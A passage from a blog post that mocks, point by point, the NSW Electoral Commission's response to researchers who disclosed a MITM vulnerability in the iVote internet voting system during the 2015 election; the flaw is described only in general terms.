were heating up because the discovery was made while the system was used by hundreds of thousands of people in a real election. The New South Wales Electoral Commission (NSWEC) didn’t take kindly to meddling cryptographers. They <a href="https://www.elections.nsw.gov.au/About-us/Public-interest-information/iVote-reports/Response-from-the-NSW-Electoral-Commission-to-iVot" target="_blank">responded</a> in more than few words. This blog post is a commentary on that response.</p>
<p>Just to clarify the severity of <a href="https://en.wikipedia.org/wiki/FREAK" target="_blank">the vulnerability</a>: it allowed an attacker to tamper with votes, but they needed a privileged network position to do so (for example, the operator of a WiFi hotspot or an Internet Service Provider could perform the attack). (The vulnerability was caused by loading an analytics JS from a poorly configured external web server. Due to the poor configuration, a MITM would be able to downgrade the encryption, break the weakened encryption, and then serve any JS instead of the real JS file.)</p>
<p>Let’s begin.</p>
<blockquote>
<p>This response concerns allegations made during the NSW 2015 state election regarding the security and integrity of the Commission’s iVote®internet voting system by researchers Dr Halderman (University of Michigan – USA) and Dr Teague (University of Melbourne).</p>
</blockquote>
<p>“Allegations”. I can see we’re off to a good start here. The NSWEC then goes on a rampage about how their authority is not being respected:</p>
<blockquote>
<p>Teague and Halderman sent a report […] to media outlets and CERT Australia […] The correct agency for Drs Teague and Halderman to have reported this incident was in fact the NSW Electoral Commission […] CERT Australia is a federal government agency, it is unable to deal with a state government agency such as NSW Electoral Commission.</p>
</blockquote>
<div><a href="https://www.attejuvonen.fi/static/533efb07b7f0f3192190b0f7579617dd/4c697/meme-cartman.jpg" target="_blank"><div><p><img src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20width='400'%20height='272'%3e%3cpath%20d='M123%205c-2%201-3%202-3%209v6l-11%205a93%2093%200%2000-47%2049l-5%2019%2015-7c56-27%20102-33%20153-21a294%20294%200%200144%2014c1-1-6-14-11-21-5-8-14-18-21-23l-5-3v-9c0-6%200-8%202-9%202-2%203-6%201-8l-8-1a4520%204520%200%2001-104%200m117%201c-2%202-3%2024-1%2027s22%203%2024%200c2-2%202-2%203%200s7%203%209%201l1-5%202-12c3-8%203-12%201-12a777%20777%200%2000-39%201m-83%201c-5%202-5%2010%201%2014%204%202%205%205%204%207s-2%201-2-1c0-3%200-3-3-3s-3%200-3%203c0%204%203%206%208%206%209%200%2010-10%201-16-3-2-4-6-2-6l1%202c0%202%201%202%203%202%203%200%203%200%203-3%200-4-6-7-11-5m48%200c-3%201-4%205-4%2015%201%209%202%2011%208%2011%205%200%208-3%208-7%200-3%200-3-3-3s-3%200-3%203l-2%203-1-9%201-9c1%200%202%203%201%205%200%202%200%202%203%202%204%200%204%200%204-4%200-6-6-9-12-7m-83%2013v13h7v-6l1-6%201%206v6h3c3%200%203%200%203-6l-1-7v-1l1-6c0-5-2-6-9-6h-6v13m18%200v13h6c6%200%206%200%206-2s0-3-2-3c-3%200-3%200-3-3%200-2%200-3%202-3l2-2c0-2-1-3-2-3l-2-2c0-2%201-3%202-3l2-2c1-3%201-3-5-3h-6v13m31%200v13h7v-5c0-6%200-6%203-6s4-1%204-6c0-8-1-9-8-9h-6v13m17%200v13h6c5%200%205%200%205-2s0-3-2-3c-3%200-3%200-3-3s0-3%203-3c2%200%202%200%202-2s0-3-2-3-3%200-3-2%201-3%203-3%202%200%202-2c0-3%200-3-5-3h-6v13m31-10l2%202c2%200%202%201%202%2011v10h6V23c0-10%200-11%202-11l2-2c0-3%200-3-7-3s-7%200-7%203m22%2010v13h6l-1-8c0-9%201-7%203%202%200%205%201%206%202%206%202%200%202%200%204-10l1-5v15h6V22c0-14%200-15-5-15-4%200-5%201-5%208%200%205-2%201-2-4V7h-9v13m23-11l4%2020c0%204%200%204%203%204s3%200%203-5l2-13%203-8h-4c-3%200-3%200-3%203l-1%205c-1%201-1%201-1-1%200-5-1-7-4-7s-3%200-2%202M122%2076c-10%202-20%2010-23%2019-2%204-3%204-26%204-12%200-16%201-17%202h41v5c0%207%203%2013%209%2019%2012%2014%2032%2014%2048%201%205-5%2014-18%2014-21%200-4%202-6%202-4l1%204c0%203%2010%2016%2014%2021%2016%2013%2035%2013%2048-1%207-7%2010-14%209-22%200-2%200-2-2-1-1%202-6%202-12%202l-5%202c-3%202-8%201-11-4-3-4-3-4%200-3h25c4%201%204%201%204-2%200-2%200-3%204-3%208%200%2027-3%2027-4l-17%201-15%201-5-5c-6-7-11-10-19-12-12-2-29%200-36%205-3%201-4%202-5%201l-8-1c-5%201-6%200-10-2-9-4-25-5-35-2m254%2018a1034%201034%200%2000-72%2039l-33%2018-6-4c-4-2-6-3-7-2l-12%2014%205-2c6-4%208-4%2016%200%208%203%2010%204%2016%202%205-1%207%200%209%205%200%202%201%205%203%207%202%201%203%204%203%205%201%206%207%207%2011%202%202-3%201-6-3-8l-2-3-3-8-4-7%2019-10c87-46%2085-45%2080-52-3-4-4-4-20%204m-242%204c1%202%2015%208%2020%208%203%200%2013-4%2013-5h-1l-1-1c1-1-2-1-6-1l-10-1c-11-2-15-2-15%200m61%200h-10c-15%201-16%202-7%206%205%202%206%203%2011%202l17-7%202-1-6-1-7%201m-94%201c-3%200-4%203-2%204l8%201%209%201c3%203%206%202%2010-2l2-4h-27m-50%2036c-11%202-13%203-12%204%202%207%203%2035%201%2038l-2%204-2%203c-4%202%202%2044%207%2049%201%202%203%205%203%208l4%207%203%208c2%207%202%207%201%208-3%201-3%206%200%206h9c8-1%2097-2%20173-1%2039%200%2044%200%2037-3-5-2-4-4%203-5l7-2c1-1%202-2%205-1%204%200%204%200%207-16%203-17%203-20%202-22-2-1-2-4-2-10%200-17-2-32-6-38-2-1-2-1-2%202-2%208-9%2020-12%2020l-8%202c-7%202-15%203-17%201s-9-22-9-27l1-6c1-2%200-3-2-1-5%206-27%2017-42%2022-50%2013-107-7-129-45l-5-7-13%202m109%2015c-13%204-13%2015%200%2013h28c8%201%2010%200%205-5-8-7-21-11-33-8m-51%2017c0%201%2016%207%2027%209%2029%206%2047%206%2063-1%209-3%208-4-1-1-17%207-27%207-54%202-16-2-22-4-29-8-5-2-6-2-6-1m90%2028a78%2078%200%20000%207l19%201h19v-10h-19c-18%200-19%200-19%202m1%203c-1%202%200%202%207%202%206%201%207%200%207-1h1l9%201c12%200%2012%200%2012-2s-5-3-5%200h-2l-1-2-2%202h-2c-1-3-14-3-14%200h-2c-1-2-1-2-2-1-1%202-3%203-2%201l-1-2-3%202m-8%2035c-3%201-5%205-5%2013%200%2010%202%2013%209%2013%206%200%207-2%207-13%200-12-3-16-11-13m-71%201l-1%2011c-3%2014-3%2014%202%2014%203%200%203%200%203-3s2-2%203%201c0%202%201%202%203%202h3v-6l-2-13-1-7h-5l-5%201m15%2010c0%2013%201%2015%208%2015%206%200%207-2%207-15v-11h-6v11l-1%2011c-1-1-2-4-2-11v-11h-6v11m17-8l2%202c2%200%202%201%202%2011v10h7v-10c0-10%200-11%202-11%201%200%202-1%202-3s0-2-8-2c-7%200-7%200-7%203m16%2010v13h7v-5l1-6%201%206v5h7v-26h-3c-4%200-4%200-4%205l-1%204-1-4c0-5%200-5-3-5h-4v13m37%200v13h6v-6c0-8%202-8%203%200%200%206%200%206%203%206s3%200%203-5c0-4-1-6-2-7s-1-1%201-3l1-5c-1-5-3-6-9-6h-6v13m17%200v13h7v-26h-7v13m9-10l2%202c2%200%202%201%202%2011v10h6v-10c0-10%201-11%203-11%201%200%202-1%202-3s0-2-7-2c-8%200-8%200-8%203m18-2l-1%2012c-3%2014-3%2013%202%2013%203%200%203%200%203-3s2-2%203%201c0%201%201%202%203%202%204%200%204%200%201-15l-1-11h-5l-5%201m15%2012v13h7v-5l1-6%201%206v5h7v-26h-3c-4%200-4%200-4%205l-1%204-1-4c0-5%200-5-3-5h-4v13M8%20265c-6%200-6%201-6%202%200%202%200%203%203%203l5%201h2l12-1c10%200%2013-1%2012-3s-12-3-13-1l-4-1-4-1-7%201'%20fill='%23f9ebd2'%20fill-rule='evenodd'/%3e%3c/svg%3e" title="Meme" alt=""></p></div></a>
</div>
<p>Let me get this straight: the national Computer Emergency Response Team was not the correct agency to report this emergency, because this was only a state level emergency, not a federal one. If you are wondering how things would have turned out if the researchers had contacted NSWEC only, wonder no more:</p>
<blockquote>
<p>ABC contacted the Commission […] did NOT advise the Commission they were operating under an embargo […] the Commission understood that publication of a story on the content of the report was imminent and not conditional on remediation of the system. Realising this and knowing the potential concern such a story would have on public confidence, particularly if the report’s proposed remediation action had not been undertaken. The Commission knew it had no option but to remove the Piwik link to the iVote® system immediately. Therefore the removal of the link was done expeditiously and without the benefit of an independent risk assessment being performed.</p>
</blockquote>
<p>Here’s a free risk assessment for you: The downside of removing that one line of code is you lose analytics. The upside is MITM
attackers can’t manipulate votes on your internet voting system. NSWEC is straight up telling us that without the media pressure they would have left the vulnerability unfixed while they would conduct their “independent risk assessment”.</p>
<blockquote>
<p>Then the ABC, without advising the Commission, ran the story […] This news story, gave a false impression of the iVote® system’s operation to the public […]</p>
</blockquote>
<p>Yeah, false how exactly? They don’t say. Oh, and HOW DARE the media report on this without our permission!</p>
<blockquote>
<p>Drs Teague and Halderman were aware that the related Piwik website was used only to provide statistics regarding the iVote core
voting system’s operation and was not essential to its main function of receiving votes.</p>
</blockquote>
<p>That’s a clever bit of misdirection right there. Yes, the NSWEC <em>intended</em> the JS dependency (“Piwik website”) to be used only for
collecting analytics. That’s what they want to highlight for the reader. Not the fact that a MITM attacker could leverage the same dependency to manipulate votes.</p>
<blockquote>
<p>The vulnerability was found by Drs Teague and Halderman using a free internet based certificate test service […] The relatively poor certificate test result […]</p>
</blockquote>
<p>What a curious choice of words. Relative to what? The test result — an F — was poor relative to other possible test results, namely A, B, C, D and E. I gotta hand it to them, they’re technically right. Everything is relative after all.</p>
<blockquote>
<p>We have been advised that the likelihood of someone intercepting online votes using this approach is similar to that of a malicious postman replacing a postal vote.</p>
</blockquote>
<p>That’s a false equivalence if I’ve ever seen one. A rogue postman will be able to replace a few votes at best. MITM attacks on a
computerized voting system scale quite differently: the effort to replace a single vote with this attack is roughly the same as the effort to change a lot of votes. For example, a large Internet Service Provider (or a rogue employee) that executes this attack would be able to change <em>all</em> of the votes sent via their connections, compared to just a few votes that a postman would be able to change.</p>
<blockquote>
<p>Should the attack […] have actually occurred the Commission would have reasonably expected that our verification service would
alerted affected voters who would have contacted the Commission. Some 1.7% of electors who voted using iVote® also used the verification service and none of them identified any anomalies with their vote.</p>
</blockquote>
<p>More than a year after the election it <a href="http://www.parliament.wa.gov.au/Parliament/commit.nsf/(Evidence+Lookup+by+Com+ID)/805D229860DF8D224825817D0010CDF1/$file/Submission+9+-+University+of+Melbourne.pdf" target="_blank">turned out</a> that this claim was false. A staggering 10% of verification attempts had failed to retrieve any vote. It is unclear whether the NSWEC was aware of the successful verification rate and lied, or was oblivious to the successful verification rate and lied.</p>
<p>The NSWEC then goes on to reveal the “hidden agenda” of Teague and Halderman:</p>
<blockquote>
<p>Teague and Halderman are advisory board members of the US based anti-internet voting lobby group Verified Voting […] Halderman and Teague are anti-internet voting activists […] Halderman has supported a statement […] Teague has endorsed […] She has also said […] Halderman has also undertaken activism […] Halderman is well known for his dramatisation of security issues […] Teague and Halderman typically do not disclose to the public their affiliation with US based anti-internet voting lobby group Verified Voting when making media statements on this subject.</p>
</blockquote>
<p>In other news, anti-heroin activists are critizing a strain of heroin. They are claiming that this particular strain is bad, when in fact they oppose all strains of heroin! We have uncovered their hidden agenda by looking at their public affiliations, board memberships in anti-heroin organizations, and statements to the media made over a number of years, all of which they attempted to hide from the public eye.</p>
<p>The attacks on Teague and Halderman continue:</p>
<blockquote>
<p>Some of the statements they have made appear to fall outside their core areas of research. In particular they recommended in “The Conversation” that electors “stick with an old-fashioned paper ballot”. The Commission is not aware of any research done by Drs Halderman and Teague which assesses the comparative risks of internet voting against paper voting for NSW elections. We therefore believe this statement is more likely a strongly held personal view rather than a product of peer reviewed and evidence based research, either conducted by them or other reputable researchers.</p>
</blockquote>
<p>Your Honor, the witness may be an expert in <a href="https://www.researchgate.net/profile/Peter_Ryan7/publication/228822923_Pretty_Good_Democracy/links/09e41506482dc48b99000000/Pretty-Good-Democracy.pdf" target="_blank">electronic voting systems</a>, an expert in <a href="https://arxiv.org/pdf/1404.6822.pdf" target="_blank">paper-based voting systems</a>, and sure, she may have <a href="https://www.usenix.org/system/files/conference/evtwote12/evtwote12-final9_0.pdf" target="_blank">implemented some voting systems specifically in Australia</a>, but let me ask the court, has she published any peer-reviewed studies on the comparative risks of internet voting against paper voting in New South Wales specifically? I rest my case.</p>
<blockquote>
<p><mark>The Commission’s view is that internet voting is not a problem for academic cryptographers to solve</mark>, but rather an evolving technology requiring a broad range of technical and electoral skills and engagement with electoral stakeholders.</p>
</blockquote>
<p>Although the entire article is a comedy goldmine, this one takes the cake. We want a broad range of technical and other skills, except for technical skills in cryptography, which we don’t want, because they’d just reveal how horribly insecure our internet voting system is. And remind me again, what <em>are</em> problems for cryptographers exactly, since internet voting isn’t one of them?</p>
<div><a href="https://www.attejuvonen.fi/static/5c45b324c6e4e88a1cc3e2703c2d2b95/45a5d/meme-meddling.jpg" target="_blank"><div><p><img src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20width='400'%20height='289'%3e%3cpath%20d='M0%2090c0%20100-1%2091%206%2080l7-8c5-4%205-4%2015-4a157%20157%200%200057-16c2%203%204%2020%205%2038%200%2026%200%2025%206%2029l5%204c0%202-2%203-2%201%200-1-3-2-7-2h-5l-1-7-1-8-1%207%201%208h-5c-8%200-8%201-8%2015l1%2015h10l3%201c2%201%203%203%200%203l-3%201h-4l-9-1H54c-5%200-7-1-7-2l8-1c9%200%2010-1%2010-6l2-5c2-2%203-7%201-8-1-1%200-2%201-4%203-5-1-8-10-8H46v-5a217%20217%200%2000-4-33l2%2018v25c-2%206-1%2020%201%2027%200%202%200%202-6%202H23c-2%202-3%200-3-5l-1-4v4c0%205%200%205-3%205-7%200-8%202-8%2016s0%2015%208%2015c40%200%2039%200%2039%205%200%202-7%204-13%204-4%200-5%200-5-2s-1-3-5-3l-4%201-1%201-1-1-1-1-1%201h-3v3c-1%201-2-1-1-3l-2-1h-6l-2%201-1%201-1-1-4-1c-4%200-4%200-4%204v4h400l1-145V0H0v90M219%207c-4%202-6%2020-1%2025%202%203%209%203%2012-1%202-2%203-14%201-20-1-4-7-6-12-4M80%2017l-2%2014c0%203%200%203%203%203s4%200%205-2c0-4%202-4%202%200%200%202%200%202%204%202s4%200%204-2l-3-14-1-11H81l-1%2010m17%204v13h3c3%200%203%200%203-5v-5l2%205c1%205%201%205%205%205h3V7h-3c-3%200-3%200-3%205v6l-2-6c-2-4-2-5-5-5h-3v14m18%200v13h7c9%200%2010-1%2010-15-1-11-1-12-11-12h-6v14m24-12l3%2023c0%202%201%202%204%202h5l1-6%201-6v6l1%206h10v-6l2-14V7h-3c-3%200-4%201-4%206-1%209-2%2010-2%203%200-8-1-9-4-9-4%200-5%201-5%208l-1%204-1-6V7h-3c-3%200-4%200-4%202m29%2012v13h12v-3c0-3%200-3-2-3s-3%200-3-2%201-3%202-3c2%200%202-1%202-3s0-3-2-3c-1%200-2-1-2-3s0-2%202-2%203%200%203-2c0-3%200-3-6-3h-6v14m19-12l1%2014%202%2011h4c4%200%204%200%206-7v-5l1%206%201%206h5c5%200%204%201%206-15%201-12%202-12-2-12h-4l-1%208c-1%206-1%207-1%203%200-10-1-11-5-11h-4v5c0%208-2%2010-2%202V7h-4c-3%200-4%200-3%202m47%2010c0%2013%201%2015%208%2015s8-2%208-15V7h-7v12l-1%2011-1-11V7h-7v12m19%202v13h6c5%200%205%200%205-3%200-2%200-3-2-3s-2-1-2-10V7h-7v14m13%200v13h6c10%200%2010-1%2010-14%200-12-1-13-10-13h-6v14m18-10c1%206%204%207%205%201%200-4%201-2%203%2017l1%205h6l5-1%201-10c3-16%203-16-1-16h-4v6c-1%209-2%209-2%201l-1-7h-13v4m25%2010v13h12v-3c0-3%200-3-2-3s-3%200-3-2%201-3%202-3c2%200%202-1%202-3s0-3-2-3c-1%200-2-1-2-3s0-2%202-1c2%200%202%200%202-3s0-3-5-3h-6v14M26%2044c-2%202-2%203-2%2012s0%2010%203%2012c2%202%205%203%206%201h7V55h-8l1%205-1%205-1-9%201-9%201%203c0%202%200%202%204%202%203%200%203%200%203-3%200-4-3-7-8-7l-6%202m19%200c-2%202-2%203-2%2012%200%2011%202%2014%208%2014s8-3%208-14c0-12-1-14-8-14l-6%202m15%201l2%203c2%200%202%201%202%2011v10h8V48h8v21h7V59c0-10%200-11%202-11s2-1%202-3v-3H60v3m33%2011v13h6c6%200%206%200%206-2s0-3-2-3c-3%200-3%200-3-3%200-2%200-3%202-3l2-2c0-2-1-3-2-3-3%200-3-5%200-5%202%200%203-1%203-3%200-3%200-3-6-3h-6v14m14%200v13h3c3%200%203%200%203-5v-5l2%205c1%205%201%205%205%205h3V42h-3c-3%200-3%200-3%206v6l-2-6c-2-6-2-6-5-6h-3v14m25-4l-2%2013c0%204%200%204%203%204s4%200%204-2c1-3%203-4%203-1s0%203%204%203h4l-2-12-2-13c0-2-1-2-5-2h-6l-1%2010m15-8l2%2013%201%2012h10v-4l1-6c1-1%201-1%201%201%200%208%201%209%206%209%204%200%204%201%206-15%201-12%202-12-2-12h-4v7c-1%208-2%2010-2%205l-1-7c0-5%200-5-4-5l-3%201-2%207-1%207v-5c0-9-1-10-5-10-2%200-3%200-3%202m30%2010l-2%2014c0%202%207%201%207-1%201-3%203-4%203-1s0%203%204%203h4l-2-13-2-14h-11l-1%2012m16-10c3%209%204%2016%204%2020v5h7v-5c0-5%202-15%205-20%200-2%200-2-3-2-4%200-4%200-5%204l-1%205v-5c-1-4-1-4-5-4-3%200-3%200-2%202m21%200l2%2013%201%2012h9l1-5c1-6%202-8%202-4%200%207%201%209%206%209s4%201%206-15c1-13%201-12-2-12h-4l-1%208-1%209v-9l-1-8h-4c-4%200-4%200-4%204l-1%208c-1%203-1%203-1-3%200-8-1-9-5-9-2%200-3%200-3%202m30-1l-1%2013v13h8V42h-3l-4%201m8%202c0%202%200%203%202%203s2%201%202%2011v10h7V59c0-10%200-11%202-11s2-1%202-3v-3h-15v3m17%2011v13h7v-5l1-6%201%206v5h7V42h-7v5l-1%205-1-5v-5h-7v14m25%200v13h7V42h-7v14m8-11l2%203c2%200%202%201%202%2011v10h8V59c0-10%200-11%202-11s2-1%202-3v-3h-8c-8%200-8%200-8%203m22%200c0%202%200%203%202%203s2%201%202%2011v10h7V59c0-10%200-11%202-11s3-1%203-3v-3h-16v3m19-1c-2%202-2%203-2%2012%200%2011%202%2014%208%2014s8-4%208-14c0-12-1-14-8-14l-6%202m18%200c-2%203-2%2021%200%2024%203%202%2010%202%2013%200%202-3%202-21%200-24-3-3-10-3-13%200M17%2065c-4%207-5%2013-2%2033%202%2012%202%2012%206%2013l5%202a195%20195%200%200054-26c2%201%206-3%208-9l2-7h-3c-2%201-3%203-4%207-2%205-2%203-1-3%201-2%201-3-1-3l-3-4c0-3-3-3-4%200-2%205-11%205-12%201%200-3%200-3-3%201-3%202-9%203-16%201-1-1-2%200-4%201-2%202-3%202-3%201l-4-1c-6%200-9-2-10-8l-2-4-3%205m175%206l-16%201-15-1-2%204-3%207c-2%203-2%203-5-4-3-5-3-6-6-6l-5-1c-5-1-6%2010-2%2026%202%2012%202%2014-1%206l-4-7-1-2h1c3%203%203%202%201-3V72c-1-1-2%202-2%207-1%208-4%2012-7%209s-4-3-6%200c-2%204-2%206%200%208v2l-2-1-1-2v4h-1l1%203v2c-3%208-5%2031-3%2031l3-2c1-1%201%200%201%203%200%205%200%205%203%205%202%200%202%200%202%204l1%204h7l1-1c3%201%205-1%207-7%201-4%203-6%204-7%202%200%202-1%201-8-1-11-1-14-2-7v9l1%204c-1%200-1%201-5-11-1-5-2-9-3-8l-2%205-1%207v5l-1-12c0-11%200-12%202-11l1-2c-2-3-2-9-1-8l1%203c0%206%202%2010%205%2011l2-2c0-4%203%205%204%2010l1%207%203-1c5%200%2010-2%2015-7%205-6%2014-9%2016-7%203%202%202%203%200%202-4-3-17%205-17%2011l1%202%201-3c0-3%201-3%204%200%204%203%206%202%208-2%200-2%202-4%203-5%203-2%203-2%204%200s1%202%206-1c8-4%2010-7%206-7l-6-3-2-3-3%202c-2%202-2%202-3%200h-8l5-2c4-1%206-4%203-6-3%200-2-2%200-2s3%200%203-2c2-5%207-7%2012-6%206%200%206%200%202-9-3-7-4-8-6-6m46%201l-2%201c-4-1-5%201-3%204%201%202%202%204%201%205%200%204%202%205%205%203s5-3%203-1-1%205%201%205l1-3v-5c2-1%201-4-2-7-2-3-4-4-4-2m52%2017l-3%201c-3-1-4%200-3%202%202%203%201%203-7%200-7-4-12-5-19-3-5%201-3%202%203%202h4c-2%202-3%205-1%207h3l4-2c3%200%203%200%200%202l-5%201%2014%203c3%200%205%201%2010%204%207%205%2020%2011%2023%2011%202%200%2011-12%2011-15%200-2-8-9-10-9l-3%205c-2%203-2%204-4%203-3%200-5-2-3-2l2-1-3-1c-3%200-3%200-1-2%201-2%201-2-2-2s-3%200-3-2-1-3-2-3c-4-1-4-1-5%201M81%2097l-6%205c0%202%200%202-1%201s-3%200-10%204l-13%207c-5%202-6%203-3%203a94%2094%200%200025-4c4-1%2015-7%2016-10%201-2%200-8-2-9l-6%203m304%207c-2%202-4%203-7%203s-3%200-3%202c2%208%202%2010%200%2016l-4%2016c-2%2010-5%2017-8%2020-5%204-8%2014-4%2016%202%201%209-1%2013-4l1-5c0-3%203-9%205-14%207-15%208-18%2010-26s3-19%201-24v-3l-4%203m-90%2011l-5%201c-2%200-8%208-9%2014-1%204-1%206%201%2011%202%206%202%2026%201%2035l-1%206h8c8%200%209-1%2019-6s11-6%207-10l-3-8c0-5-3-11-7-16l-2-2-2%203c0%202-1%203-2%203s-1-1%201-5c0-2%200-2-2%200-4%203-5%202-2-1s4-7%204-9c-2-3%202%200%204%204l5%208c3%203%204%205%206%2012%201%209%202%209%205%208%202%200%204-10%203-17l-1-9-3-9-4-7c-1-2-1-3-3-2l-5-1c-2-1-5-2-7-1-2%200-2%200-2-2%201-2-1-2-4%200M18%20128v10c2%203%2010%206%2011%204h3l4%201%206-1c11%200%2025-4%2027-8l2-2v3c-2%202-2%202%201%201%205-1%2010-4%2012-6l2-2h-7l-16%202c-12%202-32%200-43-4l-2%202m72%2011l1%205%202%208%202%207-1%201-3-11-3-9c-1%200-1%204%202%2016l1%2026v18l9-6%2011-8c2%200%202-1%202-3-3-14-23-52-23-44m-34%206c-1%202-30%203-34%202-5-1-7%200-7%203%200%202%207%203%2017%202%2012-2%2030-5%2030-7h-6m197%2031c-2%203-3%2010-2%2011l1%201%203%202c0%202%201%202%203-1%203-2%203-2%202-7s-2-5-5-6h-2m-2%2017l-6%201-5%201%201%208c2%2010%203%2010%2013%209%205-1%205-1%203-4-2-1-2-3-2-8%200-6-2-10-4-7M2%20199l-1%209v10l3-6%204-8c1-3%207-4%2013-1l3%201c1-1-7-4-13-5l-7-1-2%201m309%201l-10%201c-10%200-10%200-8%207%201%205%203%206%205%203h1l2%201%204%201h6c3-1%203-2%203-7-1-5-2-7-3-6m-76%2016c-2%203-2%204-2%2011%200%2011%202%2014%208%2014s8-3%208-13-2-14-8-14l-6%202m76-1c-3%202-4%207-4%2015%201%209%203%2011%208%2011%207%200%208-2%208-13%200-9%200-10-3-12s-5-2-9-1m18%200c-2%201-4%203-4%207%200%203%201%205%206%208%203%202%204%205%202%206l-1-2c0-2-1-3-4-3h-3v4c1%204%203%206%208%206%209%200%2010-8%203-16l-5-5c1-1%203%200%203%202l3%201c3%200%204-3%202-6-2-2-7-3-10-2M46%20228v13h7v-26h-7v13m10%200v13h3c3%200%203%200%203-5s0-6%202-6c4-1%204-5%200-5l-2-2c0-2%201-3%203-3s2%200%202-2c0-3%200-3-5-3h-6v13m18%200v13h7v-26h-7v13m9-11c0%202%201%203%202%203s2%202%202%2011v10h7v-10c0-10%200-11%202-11%201%200%202-1%202-3s0-2-7-2c-8%200-8%200-8%202m20-2a1375%201375%200%20003%2024c0%202%201%202%204%202h4l2-6%201-6v6l1%206h5l4-1a472%20472%200%20013-25h-7v6c-1%208-2%209-2%205%200-9-1-11-5-11-3%200-4%201-4%209%200%206-2%202-2-5%200-4%200-4-3-4h-4m28%2013v13h12v-3c0-3%200-3-2-3s-3%200-3-2%201-3%202-3l2-2c0-2-1-3-2-3l-2-2c0-2%201-3%203-3s2%200%202-2c0-3%200-3-6-3h-6v13m14%200v13h3c3%200%203-1%203-5%200-7%201-9%202-1%200%205%201%206%204%206%202%200%203-1%203-6l-1-6c-2-2-2-2%200-3%201-2%201-6-1-9-1-2-2-2-7-2h-6v13m17%200l1%2013h11v-3c0-3%200-3-2-3s-3%200-3-2%201-3%202-3l2-2c0-2-1-3-2-3l-2-2c0-2%201-3%203-3s2%200%202-2c0-3%200-3-6-3h-6v13m14%200v13h3c2%200%203-1%203-5l1-4%201%204c1%205%201%205%204%205h3v-26h-3c-3%200-3%200-3%205v5l-2-5c-1-5-1-5-4-5h-3v13m23-10l1%202c2%200%202%202%202%2010l1%2011h6v-10c0-10%200-11%202-11l2-2c0-3%200-3-7-3s-7%200-7%203m21%2010v13h7v-5c0-5%200-6%202-6l2-2c0-2-1-3-2-3l-2-2c0-2%201-3%203-3s2%200%202-2c0-3%200-3-6-3h-6v13m31%200v13h7v-6l1-6%201%206v6h3c3%200%203%200%203-6l-1-7v-12l-8-1h-6v13m22-10l2%202c2%200%202%201%202%2010l1%2011h6v-10c0-10%200-11%202-11l2-2c0-3%200-3-7-3-8%200-8%200-8%203m17%2010v13h3c3%200%203%200%203-5l1-6%201%206v5h7v-26h-3c-4%200-4%200-4%205l-1%204-1-4c0-5%200-5-3-5h-3v13m52%200l1%2013h11v-3c0-3%200-3-2-3-4%200-4-5-1-5%204-1%204-5%201-5s-3%200-3-2%201-3%203-3%202%200%202-2c0-3%200-3-6-3h-6v13m-216%2022c-4%203-4%2020%200%2023%201%201%203%202%207%202h6v-14h-8l1%205-1%205v-18l1%203c0%202%200%202%204%202%203%200%203%200%203-3%200-6-8-9-13-5m23%201c-2%202-2%203-2%2012%201%2010%202%2012%208%2012%205%200%208-3%208-7s0-4-3-4c-4%200-4%200-4%204l-1%203-1-10%201-8%201%204c0%203%200%203%204%203%203%200%203%200%203-4%200-7-8-11-14-5m85-2c-4%202-4%203-4%2013%200%2011%201%2013%208%2013%206%200%207-2%207-13%200-9%200-10-3-12s-5-3-8-1m17%200c-3%202-4%207-4%2016%201%208%202%2010%2010%2010h6v-14h-4c-4%200-5%201-3%204%201%202%200%206-1%205v-17l1%203c0%202%200%202%204%202%203%200%203%200%203-3%200-5-6-9-12-6m118%200c-2%201-4%203-4%207%200%203%201%205%206%208%203%202%204%205%202%206l-1-2c0-2-1-3-4-3s-3%200-3%203c0%206%208%209%2014%206%203-3%202-10-4-15-3-2-4-4-3-5%200-1%201-1%201%201%201%203%207%203%207%200%200-5-6-8-11-6M11%20262v13h6v-13l1%206c1%206%201%207%203%207s3-2%204-7l1-6v6c0%207%200%207%203%207h3v-26h-4c-5%200-6%201-6%207%200%203%200%203-1-2l-1-5h-9v13m23%200l1%2013h11v-3c0-3%200-3-2-3s-3%200-3-2%201-3%202-3l2-2c0-2-1-3-2-3l-2-2c0-2%201-3%203-3s2%200%202-2c0-3%200-3-6-3h-6v13m14%200v13h6c9%200%2010-2%2010-14-1-11-1-12-10-12h-6v13m18%200v13h6c9%200%2010-2%2010-13%200-12-1-13-10-13h-6v13m18%200v13h6c5%200%205%200%205-3%200-2%200-3-2-3s-2-1-2-10v-10h-7v13m12%200l1%2013h6v-26h-7v13m10%200v13h3c2%200%203-1%203-5%200-5%200-5%202%201%201%204%201%204%204%204h3v-26h-3c-3%200-3%200-3%205v5l-2-5c-1-5-1-5-4-5h-3v13m59%200l1%2013h6v-6l1-6%201%206v6h3c3%200%204-1%204-6l-1-6c-2-1-2-1%200-4%201-2%201-6-1-9l-8-1h-6v13m19-5l2%2013c0%205%200%205%203%205s3%200%203-4l2-12c4-10%204-10%200-10-3%200-4%201-4%206l-1-2c-1-4-2-4-5-4h-3l3%208m14%205l1%2013h6v-5c0-6%200-6%203-6%204%200%205-2%205-7%200-7-2-8-9-8h-6v13m16-10l2%202c2%200%202%201%202%2011v10h7v-11c0-9%200-10%202-10l2-3c0-2-1-2-7-2-8%200-8%200-8%203m52%2010v13h3c3%200%204-1%204-6v-6l1%206c0%205%201%206%204%206%202%200%203-1%203-6l-1-6c-2-2-2-2%200-3%202-2%201-7-1-9-1-1-3-2-7-2h-6v13m19-12l-1%2011c-3%2014-3%2014%202%2014%203%200%203%200%203-2s1-3%202-3l1%203c0%202%200%202%203%202%204%200%204%200%202-10-2-18-1-16-7-16l-5%201m15%2012v13h3c3%200%204-1%204-6s0-5%203-5c4%200%205-4%205-9-1-5-3-6-9-6h-6v13m16%200v13h7v-5l1-6%201%206v5h7v-26h-3c-4%200-4%200-4%205l-1%204-1-4c0-5%200-5-3-5h-4v13m18%200l1%2013h11v-3c0-3%200-3-2-3s-3%200-3-2%201-3%202-3l2-2c0-2-1-3-2-3l-2-2c0-2%201-3%203-3s2%200%202-2c0-3%200-3-6-3h-6v13m14%200v13h7v-6c0-4%200-6%201-5l1%205c0%205%200%206%203%206h3v-6l-1-7c-2%200-2%200%200-2%201-2%201-7-1-9-1-2-3-2-7-2h-6v13m34-8l1%2010c0%204%200%204%202%204%203%200%204-1%204-12l1-7h-8v5'%20fill='%23f9ebd2'%20fill-rule='evenodd'/%3e%3c/svg%3e" title="Meme" alt=""></p></div></a>
</div>
<p>This reminds me of a quote by another Australian politician, Malcolm Turnbull:</p>
<blockquote>
